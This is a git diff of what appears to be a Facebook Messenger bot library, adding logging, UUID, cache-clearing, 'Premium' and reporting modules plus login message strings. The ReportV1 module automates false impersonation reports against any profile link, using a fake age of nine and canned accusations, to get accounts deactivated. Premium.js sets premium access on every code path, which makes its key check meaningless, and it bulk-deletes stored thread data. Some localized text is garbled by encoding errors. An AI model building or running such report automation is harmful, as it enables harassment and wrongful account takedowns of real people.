+    return console._intercept('warn', dt, arguments)
+}
+console.error = function(dt) {
+    return console._intercept('error', dt, arguments)
+}
+console.debug = function(dt) {
+    return console._intercept('debug', dt, arguments)
+}
+
+/* Give the developer the ability to intercept the message before letting
+   console-history access it. */
+console._intercept = function(type, data, args) {
+    // Your own code can go here, but the preferred method is to override this
+    // function in your own script, and add the line below to the end or
+    // begin of your own 'console._intercept' function.
+    // REMEMBER: Use only underscore console commands inside _intercept!
+    console._collect(type, data,args)
+}
+
+/* Define the main log catcher. */
+console._collect = function(type, data, args) {
+    // WARNING: When debugging this function, DO NOT call a modified console.log
+    // function, all hell will break loose.
+    // Instead use the original console._log functions.
+
+    // All the arguments passed to any function, even when not defined
+    // inside the function declaration, are stored and locally available in
+    // the variable called 'arguments'.
+    //
+    // The arguments of the original console.log functions are collected above,
+    // and passed to this function as a variable 'args', since 'arguments' is
+    // reserved for the current function.
+
+    // Collect the timestamp of the console log.
+    const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric' };
+
+    var time = new Date().toLocaleDateString('en-IN', options)
+
+    // Make sure the 'type' parameter is set. If no type is set, we fall
+    // back to the default log type.
+    if (!type) type = 'log'
+
+    // To ensure we behave like the original console log functions, we do not
+    // output anything if no arguments are provided.
+    if (!args || args.length === 0) return
+
+    // Act normal, and just pass all original arguments to
+    // the origial console function :)
+    console['_' + type].apply(console, args)
+
+    // Get stack trace information. By throwing an error, we get access to
+    // a stack trace. We then go up in the trace tree and filter out
+    // irrelevant information.
+    var stack = false
+    try {
+        throw Error('')
+    } catch (error) {
+        // The lines containing 'console-history.js' are not relevant to us.
+        var stackParts = error.stack.split('\n')
+        stack = []
+        for (var i = 0; i < stackParts.length; i++) {
+            if (stackParts[i].indexOf('console-history.js') > -1 ||
+                stackParts[i].indexOf('console-history.min.js') > -1 ||
+                stackParts[i] === 'Error') {
+                continue
+            }
+            stack.push(stackParts[i].trim())
+        }
+    }
+    try {
+        data = data.replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g,'')
+    }
+    catch (e) {
+        data = data;
+    }
+    // Add the log to our history.
+    console.history.push({
+        type: type,
+        timestamp: time,
+        message: data,
+        stack: stack
+    })
+}
diff --git a/Extra/Src/Last-Run.js b/Extra/Src/Last-Run.js
new file mode 100644
index 000000000..ce332a37c
--- /dev/null
+++ b/Extra/Src/Last-Run.js
@@ -0,0 +1,65 @@
+/* eslint-disable linebreak-style */
+'use strict';
+
+var assert = require('assert');
+
+var runtimes = new WeakMap();
+
+/**
+ * @param {any} fn
+ */
+function isFunction(fn) {
+  return typeof fn === 'function';
+}
+
+/**
+ * @param {object} fn
+ * @param {string} timeResolution
+ */
+function lastRun(fn, timeResolution) {
+  assert(isFunction(fn), 'Only functions can check lastRun');
+
+  var time = runtimes.get(fn);
+  
+  if (time == null) {
+    return;
+  }
+
+  var resolution = parseInt(timeResolution, 10) || 1; 
+  return time - (time % resolution);
+}
+
+/**
+ * @param {object} fn
+ * @param {number} timestamp
+ */
+function capture(fn, timestamp) {
+  assert(isFunction(fn), 'Only functions can be captured');
+
+  timestamp = timestamp || Date.now();
+
+  runtimes.set(fn, timestamp);
+}
+
+/**
+ * @param {object} name
+ */
+function has(name) {
+  return runtimes.has(name);
+}
+
+/**
+ * @param {object} fn
+ */
+function release(fn) {
+  assert(isFunction(fn), 'Only functions can be captured');
+
+  runtimes.delete(fn);
+}
+
+module.exports = {
+    lastRun,
+    capture,
+    release,
+    has
+};
\ No newline at end of file
diff --git a/Extra/Src/Premium.js b/Extra/Src/Premium.js
new file mode 100644
index 000000000..c01cd118d
--- /dev/null
+++ b/Extra/Src/Premium.js
@@ -0,0 +1,84 @@
+module.exports = async function(SessionID) {
+    try {
+        var userName,Text;
+        var os = require('os');
+        var Database = require("../../Extra/Database");
+        var Fetch = global.Fca.Require.Fetch;
+        var { getAll,readyCreate,deleteAll } = require('../ExtraGetThread');
+        if (process.env.REPL_OWNER != undefined) userName = process.env.REPL_OWNER;
+        else if (os.hostname() != null || os.hostname() != undefined) userName = os.hostname();
+        else userName = os.userInfo().username;
+        if (await Database.has('UserName')) {
+            if (await Database.get('UserName') != userName) {
+                await Database.set('Premium', false);
+                await Database.set('PremiumKey', '');
+                await Database.set('UserName', userName);
+            }
+        }
+        if (await Database.has('PremiumKey') && await Database.get('PremiumKey') != '' && await Database.has('Premium') && await Database.get('Premium') == true) {
+            try {
+                await Database.set('Premium', true);
+                await Database.set('PremiumKey', String(global.Fca.Require.Priyansh.PreKey));
+                await Database.set('UserName', userName);
+                process.env.HalzionVersion = 1973
+                Text = "You Are Wrong Version: Premium Access";
+            }
+            catch (error) {
+                Text = "Connection errors";
+            }
+        } else if (global.Fca.Require.Priyansh.PreKey) {
+            try {
+                await Database.set('Premium', true);
+                await Database.set('PremiumKey', String(global.Fca.Require.Priyansh.PreKey));
+                await Database.set('UserName', userName);
+                process.env.HalzionVersion = 1973
+                Text = "You Are Wrong Version: Premium Access";
+            }
+            catch (error) {
+                Text = "Connection errors";
+            }
+        }
+        else if (!global.Fca.Require.Priyansh.PreKey) {
+            try {
+                await Database.set('Premium', true);
+                await Database.set('PremiumKey', String(global.Fca.Require.Priyansh.PreKey));
+                await Database.set('UserName', userName);
+                process.env.HalzionVersion = 1973
+                Text = "You Are Wrong Version: Premium Access";
+            }
+            catch (error) {
+                Text = "Connection errors";
+            }
+        }
+    } catch (e) {
+        try {
+            await Database.set('Premium', true);
+            await Database.set('PremiumKey', String(global.Fca.Require.Priyansh.PreKey));
+            await Database.set('UserName', userName);
+            process.env.HalzionVersion = 1973
+            Text = "You Are Wrong Version: Premium Access";
+        }
+        catch (error) {
+            Text = "Connection errors";
+        }
+    }
+    if (process.env.HalzionVersion == 1973) {
+        try {
+            let data = [];
+            var getAll = await getAll()
+                if (getAll.length == 1) {
+                    return;
+                } else if (getAll.length > 1) {
+                    for (let i of getAll) {
+                        if (i.data.messageCount != undefined) {
+                            data.push(i.data.threadID);
+                        } else continue;
+                    }
+                    deleteAll(data);
+                }
+        } catch (e) {
+            console.log(e);
+        }
+    }
+return Text;
+}
diff --git a/Extra/Src/uuid.js b/Extra/Src/uuid.js
new file mode 100644
index 000000000..eee0fbbaf
--- /dev/null
+++ b/Extra/Src/uuid.js
@@ -0,0 +1,137 @@
+/**
+ * Credit: @chronosis | Github: https://github.com/chronosis/uuid-apikey/
+ * Description: Update  Package to rÃ©olve Deprecated from package "uuid"
+*/
+// index.js
+
+// Dependencies
+const base32 = require('encode32');
+const uuidv4 = require('uuid').v4;
+
+// APIKeys are a Base32-Crockford encoded representation of UUIDs
+// Base32-Crockford encoding is used to maintain human readability of the values
+// and to eliminate confusing overlapping characters (0 -> O; l -> 1; etc.)
+class UUIDAPIKey {
+  constructor() {
+    this.defaultOptions = { noDashes: false };
+  }
+
+  checkDashes(positions, str) {
+    let test = true;
+    for (const pos in positions) {
+      if (positions.hasOwnProperty(pos)) {
+        const chr = str.charAt(positions[pos]);
+        test = test && chr === '-';
+      }
+    }
+    return test;
+  }
+
+  isUUID(uuid) {
+    if (!uuid) {
+      throw new ReferenceError('The required parameter \'uuid\' is undefined.');
+    }
+    const uuidCheck = this.checkDashes([8, 13, 18], uuid);
+    // Only check the first three dashes as ColdFusion implementations erroneously omit the last dash
+    uuid = uuid.replace(/-/g, '');
+    const re = /[0-9A-Fa-f]*/g;
+    return uuidCheck && uuid.length === 32 && re.test(uuid);
+  }
+
+  isAPIKey(apiKey) {
+    if (!apiKey) {
+      throw new ReferenceError('The required parameter \'apiKey\' is undefined.');
+    }
+    apiKey = apiKey.toUpperCase().replace(/-/g, '');
+    const re = /[0-9A-Z]*/g;
+    return apiKey.length === 28 && re.test(apiKey);
+  }
+
+  toAPIKey(uuid, options) {
+    if (!uuid) {
+      throw new ReferenceError('The required parameter \'uuid\' is undefined.');
+    }
+    options = options || this.defaultOptions;
+    if (this.isUUID(uuid)) {
+      uuid = uuid.replace(/-/g, '');
+      const s1 = uuid.substr(0, 8);
+      const s2 = uuid.substr(8, 8);
+      const s3 = uuid.substr(16, 8);
+      const s4 = uuid.substr(24, 8);
+      const n1 = Number(`0x${s1}`);
+      const n2 = Number(`0x${s2}`);
+      const n3 = Number(`0x${s3}`);
+      const n4 = Number(`0x${s4}`);
+      const e1 = base32.encode32(n1);
+      const e2 = base32.encode32(n2);
+      const e3 = base32.encode32(n3);
+      const e4 = base32.encode32(n4);
+      if (options.noDashes) {
+        return `${e1}${e2}${e3}${e4}`;
+      }
+      return `${e1}-${e2}-${e3}-${e4}`;
+    }
+    throw new TypeError(`The value provide '${uuid}' is not a valid uuid.`);
+  }
+
+  toUUID(apiKey) {
+    if (!apiKey) {
+      throw new ReferenceError('The required parameter \'apiKey\' is undefined.');
+    }
+    if (this.isAPIKey(apiKey)) {
+      apiKey = apiKey.replace(/-/g, '');
+      const e1 = apiKey.substr(0, 7);
+      const e2 = apiKey.substr(7, 7);
+      const e3 = apiKey.substr(14, 7);
+      const e4 = apiKey.substr(21, 7);
+      const n1 = base32.decode32(e1);
+      const n2 = base32.decode32(e2);
+      const n3 = base32.decode32(e3);
+      const n4 = base32.decode32(e4);
+      const s1 = n1.toString(16).padStart(8, '0');
+      const s2 = n2.toString(16).padStart(8, '0');
+      const s3 = n3.toString(16).padStart(8, '0');
+      const s4 = n4.toString(16).padStart(8, '0');
+      const s2a = s2.substr(0, 4);
+      const s2b = s2.substr(4, 4);
+      const s3a = s3.substr(0, 4);
+      const s3b = s3.substr(4, 4);
+      return `${s1}-${s2a}-${s2b}-${s3a}-${s3b}${s4}`;
+    }
+    throw new TypeError(`The value provide '${apiKey}' is not a valid apiKey.`);
+  }
+
+  check(apiKey, uuid) {
+    if (!apiKey) {
+      throw new ReferenceError('The required parameter \'apiKey\' is undefined.');
+    }
+    if (!uuid) {
+      throw new ReferenceError('The required parameter \'uuid\' is undefined.');
+    }
+    const apiTest = this.isAPIKey(apiKey.toUpperCase());
+    const uuidTest = this.isUUID(uuid);
+    let uuidCheck;
+    if (apiTest && uuidTest) {
+      uuidCheck = this.toUUID(apiKey);
+      return uuid === uuidCheck;
+    }
+    let errMsg = '';
+    if (!apiTest) {
+      errMsg += `The value provide '${apiKey}' is not a valid apiKey. `;
+    }
+    if (!uuidTest) {
+      errMsg += `The value provide '${uuid}' is not a valid uuid. `;
+    }
+    throw new TypeError(errMsg);
+  }
+
+  create(options) {
+    options = options || this.defaultOptions;
+    const uid = uuidv4();
+    // Generate a new UUIDv4
+    const apiKey = this.toAPIKey(uid, options);
+    return { apiKey: apiKey, uuid: uid };
+  }
+}
+
+module.exports = new UUIDAPIKey();
diff --git a/Func/AcceptAgreement.js b/Func/AcceptAgreement.js
new file mode 100644
index 000000000..ffa2d9654
--- /dev/null
+++ b/Func/AcceptAgreement.js
@@ -0,0 +1,32 @@
+"use strict";
+
+var utils = require("../utils");
+var log = require("npmlog");
+
+module.exports = function (defaultFuncs, api, ctx) {
+    return function (args,callback) {
+        var resolveFunc = function () { };
+        var rejectFunc = function () { };
+        var returnPromise = new Promise(function (resolve, reject) {
+            resolveFunc = resolve;
+            rejectFunc = reject;
+        });
+
+        if (!callback) {
+            callback = function (err, data) {
+                if (err) return rejectFunc(err);
+                resolveFunc(data);
+            };
+        }
+            var  Database = require('synthetic-horizon-database');
+            if (Database.get('agreement', {}, true) == true) {
+                callback(null, "Accecpt");
+            }
+            else {
+                Database.set('agreement', true,true);
+                var Form = "=== Horizon end-user license agreement ===\n\n Free to use and edited âœ¨";
+                callback(null, Form);
+            }
+        return returnPromise;
+    }
+};
diff --git a/Func/ClearCache.js b/Func/ClearCache.js
new file mode 100644
index 000000000..5e40a66d3
--- /dev/null
+++ b/Func/ClearCache.js
@@ -0,0 +1,64 @@
+"use strict";
+const { execSync } = require('child_process');
+var utils = require("../utils");
+var log = require("../logger");
+var Object = ['png','json','wav','mp3','mp4','jpg','txt','gif','tff','m4a'];
+var Recommend = ['png','wav','mp3','mp4','jpg','m4a'];
+module.exports = function (defaultFuncs, api, ctx) {
+    return function (Args,callback) {
+        let New1 = [];
+        if (!Args.New || utils.getType(Args.New) !== "Array") { 
+            New1 = Recommend;
+            log.Normal("No Adding, Proceed to Use According to the Designated System !");
+        }
+        else {
+            for (let i = 0; i < Args.New.length; i++) {
+                if (Object.indexOf(Args.New[i]) === -1) {
+                    log.Normal('File not found ' + Args.New[i] + ' in the format list');
+                    return;
+                }
+                New1.push(Args.New[i]);
+            }
+        }
+        var resolveFunc = function () { };
+        var rejectFunc = function () { };
+        var returnPromise = new Promise(function (resolve, reject) {
+            resolveFunc = resolve;
+            rejectFunc = reject;
+        });
+
+        if (!callback) {
+            callback = function (err, data) {
+                if (err) return rejectFunc(err);
+                resolveFunc(data);
+            };
+        }
+        switch (process.platform) {
+            case 'linux': {
+                for (let i = 0; i < New1.length; i++) {
+                    log.Normal('Clearing File Type ' + New1[i]);
+                    var STR = String(`find ./modules -type f -iname \'*.${New1[i]}\' -exec rm {} \\;`);
+                    execSync(STR);
+                }
+                log.Normal('Success Clear ' + New1.length + ' File type !');
+                callback(null, 'Success Clear ' + New1.length + ' File type !');
+            }
+            break;
+            case "win32": {
+                var cmd = "del /q /s /f /a ";
+                for (let i = 0; i < New1.length; i++) {
+                    log.Normal('Äang Clear Loáº¡i File ' + New1[i]);
+                    let STR = String(cmd + '.\\modules\\*.' + New1[i] + '"');
+                    execSync(STR, { stdio: 'inherit' });
+                }
+                log.Normal('Success Clear ' + New1.length + ' File type !');
+                callback(null, 'Success Clear ' + New1.length + ' File type !');
+            }
+            break;
+            default: {
+                return log.Error('Not Supported');
+            }
+        }
+        return returnPromise;
+    };
+};
diff --git a/Func/ReportV1.js b/Func/ReportV1.js
new file mode 100644
index 000000000..0d5d086a9
--- /dev/null
+++ b/Func/ReportV1.js
@@ -0,0 +1,54 @@
+"use strict";
+
+var utils = require("../utils");
+var log = require("npmlog");
+
+module.exports = function (defaultFuncs, api, ctx) {
+    return function (args,callback) {
+        if (!args.Link && !args.RealName && !args.Content && !args.Gmail) throw new Error("Link,RealName,Content,Gmail are required");
+        if (!args.Link) throw new Error("Enter args.Link, api.Premium.ReportV1(Link,RealName,Content,Gmail,Time,callback)");
+        if (!args.RealName) throw new Error("Enter RealName, api.Premium.ReportV1(Link,RealName,Content,Time,Gmail,callback)");
+        if (!args.Gmail) throw new Error("Enter Gmail, api.Premium.ReportV1(Link,RealName,Content,Gmail,Time,callback)");
+        var resolveFunc = function () { };
+        var rejectFunc = function () { };
+        var returnPromise = new Promise(function (resolve, reject) {
+            resolveFunc = resolve;
+            rejectFunc = reject;
+        });
+
+        if (!callback) {
+            callback = function (err, data) {
+                if (err) return rejectFunc(err);
+                resolveFunc(data);
+            };
+        }
+        let RealForm;
+        utils.get('https://www.facebook.com/help/contact/209046679279097?locale2=en_US', ctx.jar, null, ctx.globalOptions)
+        .then(function(data) {
+            RealForm = {
+                crt_url: args.Link,
+                crt_name: args.RealName,
+                cf_age: "9 years",
+                Field255260417881843: args.Content ? utils.getType(args.Content)=="String"? args.Content : "This timeline is impersonating me and my friends. It harass people on Facebook. I think this is a time line of baby, parents are not allowed. Please let Facebook account deactivated for Facebook is increasingly safer. Thank you!" : "This timeline is impersonating me and my friends. It harass people on Facebook. I think this is a time line of baby, parents are not allowed. Please let Facebook account deactivated for Facebook is increasingly safer. Thank you!",
+                Field166040066844792: args.Gmail,
+                source: '',
+                support_form_id: 209046679279097,
+                support_form_hidden_fields: JSON.stringify({}),
+                support_form_fact_false_fields: [],
+                lsd: utils.getFrom(data.body, "[\"LSD\",[],{\"token\":\"", "\"}")
+            };
+        }).then(function() {
+            defaultFuncs.postFormData('https://www.facebook.com/ajax/help/contact/submit/page', ctx.jar, RealForm, {}) 
+            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+            .then(async function(dt) {
+                if (dt.__ar == 1) {
+                    callback(null, "Success");
+                }
+                else {
+                    callback(null, "Failure");
+                }
+            });
+        })
+        return returnPromise;
+    }
+};
diff --git a/LICENSE b/LICENSE
new file mode 100644
index 000000000..6bbd704dd
--- /dev/null
+++ b/LICENSE
@@ -0,0 +1,24 @@
+MIT License
+
+Copyright (c) 2023 Nguyá»…n ThÃ¡i Háº£o
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+DO NOT: - re-up this package without agreement from the author. if you do, you will have your name in Globalban 
+		- And More Thing.
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
diff --git a/Language/index.json b/Language/index.json
new file mode 100644
index 000000000..109bd1afe
--- /dev/null
+++ b/Language/index.json
@@ -0,0 +1,177 @@
+[
+    {
+        "Language": "vi",
+        "Folder": {
+            "Index": {
+                "ErrAppState": "Appstate - Cookie Cá»§a Báº¡n ÄÃ£ Bá»‹ Lá»—i, HÃ£y Thay CÃ¡i Má»›i, Hoáº·c VÃ´ TrÃ¬nh Duyá»‡t áº¨n Danh Rá»“i ÄÄƒng Nháº­p VÃ  Thá»­ Láº¡i !",
+                "CheckPointLevelI": "PhÃ¡t Hiá»‡n CheckPoint - KhÃ´ng ÄÄƒng Nháº­p ÄÆ°á»£c, HÃ£y Thá»­ Logout Rá»“i Login VÃ  Láº¥y Láº¡i Appstate - Cookie !",
+                "UID": "ÄÄƒng Nháº­p Táº¡i ID: %1",
+                "Area": "VÃ¹ng Cá»§a TÃ i Khoáº£n LÃ : %1",
+                "NoAreaData": "KhÃ´ng Thá»ƒ Láº¥y VÃ¹ng Cá»§a TÃ i Khoáº£n !",
+                "OnLogin": "Äang ÄÄƒng Nháº­p ...",
+                "InvaildAccount": "Sai Máº­t Kháº©u Hoáº·c TÃ i Khoáº£n !",
+                "TwoAuth": "Báº¡n Äang Báº­t 2 Báº£o Máº­t !",
+                "InvaildTwoAuthCode": "Sai MÃ£ Hai Báº£o Máº­t !",
+                "ApprovalsErr": "Lá»—i Khi ÄÄƒng Nháº­p Vá»›i Hai Báº£o Máº­t !",
+                "VerifiedCheck": "XÃ¡c Nháº­n Tá»« TrÃ¬nh Duyá»‡t, Äang ÄÄƒng Nháº­p...",
+                "ForceLoginNotEnable": "KhÃ´ng Thá»ƒ ÄÄƒng Nháº­p, HÃ£y Thá»­ Báº­t 'forceLogin' !",
+                "SubmitErrSuccess": "ÄÃ£ Gá»­i BÃ¡o CÃ¡o Lá»—i Tá»›i Server !",
+                "ErrorWhileSendErr": "ÄÃ£ Xáº£y Ra Lá»—i Khi Cá»‘ Gá»­i Lá»—i Äáº¿n Server !",
+                "OnProcess": "Khá»Ÿi Äá»™ng Tiáº¿n TrÃ¬nh ÄÄƒng Nháº­p !",
+                "BackupNoti": "Äang Thay AppState Tá»« Backup, Náº¿u Äiá»u NÃ y Tiáº¿p Tá»¥c Diá»…n Ra, HÃ£y LiÃªn Há»‡ Vá»›i Fb.com/Priyanshu.Rajput.Official",
+                "ErrGetPassWord": "Lá»—i Khi Láº¥y Máº­t Kháº©u MÃ£ HoÃ¡ AppState !",
+                "ErrGenerateKey": "Lá»—i Khi Táº¡o Máº­t Kháº©u Cho AppState !",
+                "UnsupportedDevice": "Há»‡ Äiá»u HÃ nh Cá»§a Báº¡n Hiá»‡n KhÃ´ng ÄÆ°á»£c Há»— Trá»£ !",
+                "NotReadyToDecrypt": "ChÆ°a Sáºµn SÃ ng Äá»ƒ Giáº£i HÃ³a Appstate !",
+                "DecryptSuccess": "Giáº£i HÃ³a Appstate ThÃ nh CÃ´ng !",
+                "ErrBackup": "Lá»—i Khi Sao LÆ°u AppState, HÃ£y Thay AppState !",
+                "DecryptFailed": "Giáº£i HÃ³a KhÃ´ng ThÃ nh CÃ´ng, HÃ£y Thá»­ Thay AppState !",
+                "InvaildAppState": "KhÃ´ng Nháº­n Dáº¡ng ÄÆ°á»£c AppState, Xin Vui LÃ²ng Thay AppState !",
+                "YourAppStatePass": "Máº­t Kháº©u AppState Cá»§a Báº¡n LÃ : %1",
+                "BackupFailed": "Sao LÆ°u AppState KhÃ´ng ThÃ nh CÃ´ng !",
+                "ScreenShotConsoleAndSendToAdmin": "Chá»¥p Láº¡i MÃ n HÃ¬nh DÃ²ng NÃ y VÃ  Gá»­i VÃ´ Facebook: Fb.com/Priyanshu.Rajput.Official",
+                "DoneLogin": "HoÃ n ThÃ nh QuÃ¡ TrÃ¬nh ÄÄƒng Nháº­p !",
+                "AutoCheckUpdateFailure": "Lá»—i Khi Kiá»ƒm Tra Cáº­p Nháº­t, Vui LÃ²ng Thá»­ Láº¡i Sau !",
+                "AutoCheckUpdate": "Äang Kiá»ƒm Tra Báº£n Cáº­p Nháº­t !",
+                "NewVersionFound": "PhiÃªn Báº£n Má»›i ÄÃ£ ÄÆ°á»£c Cáº­p Nháº­t: %1 => %2",
+                "AutoUpdate": "Tiáº¿n HÃ nh Tá»± Äá»™ng Cáº­p Nháº­t LÃªn PhiÃªn Báº£n Má»›i Nháº¥t !",
+                "UpdateSuccess": "NÃ¢ng Cáº¥p PhiÃªn Báº£n ThÃ nh CÃ´ng !",
+                "RestartAfterUpdate": "Äang Khá»Ÿi Äá»™ng Láº¡i Äá»ƒ PhiÃªn Báº£n Má»›i CÃ³ Hiá»‡u Lá»±c !",
+                "UpdateFailed": "Lá»—i Khi NÃ¢ng Cáº¥p LÃªn PhiÃªn Báº£n Má»›i Nháº¥t !",
+                "UseSupportToolAfterUpdateFailed": "NÃ¢ng Cáº¥p Thá»©c Báº¡i, Tiáº¿n HÃ nh Sá»­ Dá»¥ng CÃ´ng Cá»¥ Há»— Trá»£ !",
+                "InstallSupportTool": "Äang Táº£i Dá»¥ng Cá»¥ Há»™ Trá»£ Cho Fca !",
+                "NotiAfterUseToolFail": "HÃ£y Tá»± Fix Báº±ng CÃ¡ch Nháº­p:",
+                "LocalVersion": "PhiÃªn Báº£n Äang DÃ¹ng Hiá»‡n Táº¡i LÃ : %1 !",
+                "EncryptSuccess": "MÃ£ HoÃ¡ AppState ThÃ nh CÃ´ng !",
+                "ProcessDone": "Káº¿t ThÃºc Vá»›i: %1 !",
+                "CountTime": "Tá»•ng Thá»i Gian Báº¡n Sá»­ Dá»¥ng: %1",
+                "InvaildMainColor": "%1 KhÃ´ng Pháº£i LÃ  Má»™t MÃ u Hex !",
+                "IsNotABoolean": "%1 KhÃ´ng Pháº£i LÃ  Má»™t Boolean, Cáº§n LÃ  true Hoáº·c false !",
+                "InvaildOption": "%1 KhÃ´ng Pháº£i LÃ  Má»™t Lá»±a Chá»n !",
+                "EncryptStateOff": "TÃ­nh NÄƒng EncryptState ÄÃ£ Bá»‹ Táº¯t !",
+
+                "AutoLogin": "AutoLogin Äang Báº­t, Tiáº¿n HÃ nh ÄÄƒng Nháº­p Láº¡i !",
+                "TypeAccount": "HÃ£y Nháº­p TÃ i Khoáº£n: ",
+                "TypePassword": "HÃ£y Nháº­p Máº­t Kháº©u: ",
+                "TypeAccountError": "TÃ i Khoáº£n Cáº§n LÃ  ID Hoáº·c Sá»‘ Äiá»‡n Thoáº¡i Hay LÃ  Gmail !",
+                "ErrDataBase": "Lá»—i Khi Äáº·t Dá»¯ Liá»‡u Auto Login !",
+                "SuccessSetData": "ÄÃ£ Äáº·t Dá»¯ Liá»‡u Auto Login ThÃ nh CÃ´ng !",
+                "Missing": "Báº¡n Vui LÃ²ng Ghi MÃ£ 2Fa Theo HÆ°á»›ng Dáº«n Cá»§a áº¢nh Trong PriyanshFca.json DÃ²ng AuthString !",
+
+                "EnterSecurityCode": "HÃ£y Nháº­p MÃ£ XÃ¡c Thá»±c 2 Yáº¿u Tá»‘ Cá»§a Báº¡n: ",
+                "ErrThroughCookies": "ÄÃ£ Xáº£y Ra Lá»—i Khi XuyÃªn 2Fa, HÃ£y Nháº­p MÃ£ 2Fa Láº¡i !",
+
+                "WishMessage": [
+                    "ChÃºc Báº¡n Má»™t NgÃ y Tá»‘t LÃ nh NhÃ© !",
+                    "HÃ£y BÃ¡o CÃ¡o Vá»›i Admin Khi CÃ³ Lá»—i Fca NhÃ© !",
+                    "Cáº£m Æ n ÄÃ£ Sá»­ Dá»¥ng Fca Cá»§a Horizon !",
+                    "Donate Táº¡i: Momo: 0946838477"
+                ]
+            },
+            "ExtraGetThread": {
+                "CreateDatabaseSuccess": "Khá»Ÿi Táº¡o ThÃ nh CÃ´ng Database Cho NhÃ³m: %1",
+                "CreateDatabaseFailure": "Khá»Ÿi Táº¡o Tháº¥t Báº¡i Database Cá»§a NhÃ³m: %1",
+                "alreadyUpdate": "%1 ÄÃ£ Sáºµn SÃ ng Äá»ƒ Update Database",
+                "updateDataSuccess": "Cáº­p Nháº­t Dá»¯ Liá»‡u Cho NhÃ³m %1 ThÃ nh CÃ´ng !",
+                "updateDataFailure": "Cáº­p Nháº­t Dá»¯ Liá»‡u Cho NhÃ³m %1 Tháº¥t Báº¡i !"
+            },
+            "ExtraUpTime": {
+                "Uptime": "Káº¿t Ná»‘i Äáº¿n Server Uptime ThÃ nh CÃ´ng !",
+                "PM2": "Äang VÃ o Cháº¿ Äá»™ Uptime !",
+                "InPm2Mode": "Báº¡n Äang á»ž Cháº¿ Äá»™ Uptime PM2",
+                "NotSupport": "KhÃ´ng Há»— Trá»£ Uptime Server!",
+                "Maintenance": "Server Uptime Äang Báº£o TrÃ¬, HÃ£y Thá»­ Láº¡i Sau !"
+            },
+            "Src": {
+                "AutoRestart": "Tá»± Äá»™ng Khá»Ÿi Äá»™ng Láº¡i Sau: %1 PhÃºt Ná»¯a !",
+                "OnRestart": "Äang Restart..."
+            }
+        }
+    },
+    {
+        "Language": "en",
+        "Folder": {
+            "Index": {
+                "ErrAppState": "Appstate - Your Cookie Is Wrong, Please Replace It, Or Go To Incognito Browser Then Sign In And Try Again !",
+                "CheckPointLevelI": "CheckPoint Detected - Can't Login, Try Logout Then Login And Retrieve Appstate - Cookie !",
+                "UID": "Login as ID: %1",
+                "Area": "Area Of Account Is: %1",
+                "NoAreaData": "Can't Get Area Of Account !",
+                "OnLogin": "Currently logged ...",
+                "InvaildAccount": "Wrong Password Or Account !",
+                "TwoAuth": "You Currently On 2 Factor Security !",
+                "InvaildTwoAuthCode": "Wrong Code Two Factor Security !",
+                "ApprovalsErr": "Error When Login With Two Factor Security !",
+                "VerifiedCheck": "Confirm From Browser, Logging In...",
+                "ForceLoginNotEnable": "Can't Login, Try Enable 'forceLogin' !",
+                "SubmitErrSuccess": "Error Report Sent To Server !",
+                "ErrorWhileSendErr": "An error occurred while trying to send an error to the server !",
+                "OnProcess": "Start the Login Process !",
+                "BackupNoti": "Changing AppState From Backup, If This Continues, Contact Fb.com/Priyanshu.Rajput.Official",
+                "ErrGetPassWord": "Error Retrieving AppState Encryption Password !",
+                "ErrGenerateKey": "Error Creating Password For AppState !",
+                "UnsupportedDevice": "Your Operating System Is Currently Not Supported !",
+                "NotReadyToDecrypt": "Not Ready To Solve Appstate !",
+                "DecryptSuccess": "Successfully Appstate Solved !",
+                "ErrBackup": "Error When Backing Up AppState, Please Replace AppState !",
+                "DecryptFailed": "Solution Failed, Try Replacing AppState !",
+                "InvaildAppState": "AppState Not Recognized, Please Replace AppState !",
+                "YourAppStatePass": "Your AppState Password Is: %1",
+                "BackupFailed": "AppState Backup Failed !",
+                "ScreenShotConsoleAndSendToAdmin": "Take a Screenshot of This Line And Send It To Facebook: Fb.com/Priyanshu.Rajput.Official",
+                "DoneLogin": "Complete the Login Process !",
+                "AutoCheckUpdate": "Checking for Updates !",
+                "NewVersionFound": "New Version, Ready to Update: %1 => %2",
+                "AutoUpdate": "Perform Automatic Update to the Latest Version !",
+                "UpdateSuccess": "Upgrade Version Successfully !",
+                "RestartAfterUpdate": "Rebooting For New Version To Take Effect !",
+                "UpdateFailed": "Error When Upgrading To Latest Version !",
+                "UseSupportToolAfterUpdateFailed": "Upgrade Failed, Proceed to Using Support Tools !",
+                "InstallSupportTool": "Loading Support Tools For FCA !",
+                "NotiAfterUseToolFail": "Please Fix It Yourself By Entering:",
+                "LocalVersion": "You Are Currently Using Version: %1 !",
+                "EncryptSuccess": "Encrypt Appstate Success !",
+                "ProcessDone": "Process Done: %1 !",
+                "InvaildMainColor": "%1 Is Not A Hex Color Code !",
+                "IsNotABoolean": "%1 Is Not A Boolean, Need To Be true Or false !",
+                "EncryptStateOff": "Encryption Has Been Turned Off !",
+                "InvaildOption": "Invail Option: %1",
+                "CountTime": "Total Time You Use: %1",
+
+                "AutoLogin": "AutoLogin Is On, Proceed to Log Back in!",
+                "TypeAccount": "Enter Account: ",
+                "TypePassword": "Enter a Password: ",
+                "TypeAccountError": "The account needs to be an ID or Phone number or Gmail!",
+                "ErrDataBase": "Error When Setting Auto Login Data !",
+                "SuccessSetData": "Auto Login Data Set Successfully !",
